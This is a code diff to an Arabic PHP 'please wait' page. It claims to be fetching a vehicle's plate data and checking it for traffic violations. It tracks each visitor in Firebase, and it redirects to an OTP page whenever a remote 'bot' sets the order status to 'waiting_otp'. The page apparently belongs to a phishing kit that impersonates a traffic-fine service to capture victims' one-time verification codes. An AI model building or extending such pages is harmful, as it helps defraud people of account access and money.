@@ -1,5 +1,5 @@
 <?php
-// صفحة الانتظار الذكية - النسخة النهائية المستقرة
+// صفحة الانتظار الذكية - متوافقة مع البوت الجديد
 ?>
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -16,7 +16,7 @@
             display: flex; justify-content: center; align-items: center;
             height: 100vh; overflow: hidden;
         }
-        .loading-container { text-align: center; padding: 20px; width: 100%; }
+        .loading-container { text-align: center; padding: 20px; width: 100%; max-width: 420px; }
         .spinner {
             width: 60px; height: 60px;
             border: 6px solid #ddd;
@@ -27,7 +27,7 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .text { color: #333; font-size: 20px; font-weight: 600; margin-bottom: 10px; }
-        .sub-text { color: #6e6e6e; font-size: 15px; }
+        .sub-text { color: #6e6e6e; font-size: 15px; line-height: 1.7; }
         .progress-bar {
             width: 200px; height: 6px;
             background: #eee; border-radius: 3px;
@@ -39,16 +39,29 @@
             animation: grow 20s ease-in-out forwards;
         }
         @keyframes grow { from { width: 0%; } to { width: 98%; } }
+        .error-box {
+            margin-top: 18px;
+            padding: 14px;
+            border-radius: 12px;
+            background: #fff2f2;
+            color: #a40000;
+            border: 1px solid #ffc7c7;
+            display: none;
+            text-align: right;
+            font-size: 14px;
+            line-height: 1.7;
+        }
     </style>
 </head>
 <body>
 
     <div class="loading-container">
-        <div class="spinner"></div>
+        <div class="spinner" id="spinner"></div>
         <div class="text" id="main-text">جاري الاتصال بالنظام المركزي...</div>
-        <div class="sub-text">يرجى الانتظار، يتم الآن سحب بيانات اللوحة</div>
+        <div class="sub-text">يرجى الانتظار، يتم الآن سحب بيانات اللوحة والتحقق من وجود المخالفات.</div>
         <div class="progress-bar"><div class="progress-fill"></div></div>
         <div class="sub-text" id="status-msg">يتم التحقق من قاعدة البيانات...</div>
+        <div class="error-box" id="error-box"></div>
     </div>
 
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
@@ -63,49 +76,62 @@
             messagingSenderId: "927435762624",
             appId: "1:927435762624:web:11d0bf460b62e4af9db625"
         };
-        
+
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
         const orderId = sessionStorage.getItem("last_order_id");
 
+        function showError(message) {
+            document.getElementById("spinner").style.display = "none";
+            document.getElementById("main-text").innerText = "تعذر إكمال العملية حالياً";
+            document.getElementById("status-msg").innerText = "حدثت مشكلة أثناء معالجة الطلب.";
+            const errorBox = document.getElementById("error-box");
+            errorBox.style.display = "block";
+            errorBox.innerText = message || "يرجى إعادة المحاولة بعد قليل.";
+        }
+
         if (!orderId) {
-            // بدل ما نرجعه للرئيسية فوراً ونعمل إزعاج، هنطلب منه إعادة المحاولة لو مفيش ID
-            document.getElementById("status-msg").innerText = "خطأ في الجلسة، يرجى العودة للرئيسية.";
+            showError("لم يتم العثور على رقم الطلب الحالي. من فضلك ارجع للصفحة الرئيسية وحاول مرة أخرى.");
         } else {
-            // تحديث التواجد (Active Visits)
             db.collection("active_visits").doc(orderId).set({
                 page: "Loading Page",
                 last_seen: firebase.firestore.FieldValue.serverTimestamp()
             }, { merge: true });
 
-            // مراقبة ذكية للطلب
             const unsubscribe = db.collection("orders").doc(orderId)
                 .onSnapshot((doc) => {
-                    if (doc.exists) {
-                        const data = doc.data();
-                        const status = data.status;
-
-                        if (status === "processing") {
-                            document.getElementById("status-msg").innerText = "تم العثور على البيانات، جاري معالجة المخالفات...";
-                        }
-
-                        if (status === "success") {
-                            unsubscribe();
-                            window.location.replace("violations_view.php"); 
-                        }
-                        
-                        // إضافة حالة الـ OTP عشان لو البوت طلب الكود
-                        if (status === "waiting_otp") {
-                            unsubscribe();
-                            window.location.replace("otp.php");
-                        }
-
-                        if (status === "error") {
-                            document.getElementById("main-text").innerText = "نعتذر منك";
-                            document.getElementById("status-msg").innerHTML = "<span style='color:red'>عذراً، لم نتمكن من جلب البيانات حالياً. يرجى المحاولة لاحقاً.</span>";
-                            // شلنا الـ redirect التلقائي عشان الزبون يشوف الرسالة
-                        }
+                    if (!doc.exists) {
+                        showError("الطلب غير موجود في قاعدة البيانات.");
+                        return;
                     }
+
+                    const data = doc.data();
+                    const status = data.status;
+
+                    if (status === "pending") {
+                        document.getElementById("status-msg").innerText = "الطلب في قائمة الانتظار، وسيبدأ الفحص خلال لحظات...";
+                    }
+
+                    if (status === "processing") {
+                        document.getElementById("status-msg").innerText = "تم العثور على الطلب، وجارٍ فحص المخالفات الآن...";
+                    }
+
+                    if (status === "completed" || status === "success") {
+                        unsubscribe();
+                        window.location.replace("violations_view.php");
+                    }
+
+                    if (status === "waiting_otp") {
+                        unsubscribe();
+                        window.location.replace("otp.php");
+                    }
+
+                    if (status === "error") {
+                        unsubscribe();
+                        showError(data.error_message || data.last_error || "تعذر جلب بيانات المخالفات حاليًا. يرجى المحاولة لاحقًا.");
+                    }
+                }, (error) => {
+                    showError(error.message || "فشل الاتصال بقاعدة البيانات.");
                 });
         }
     </script>
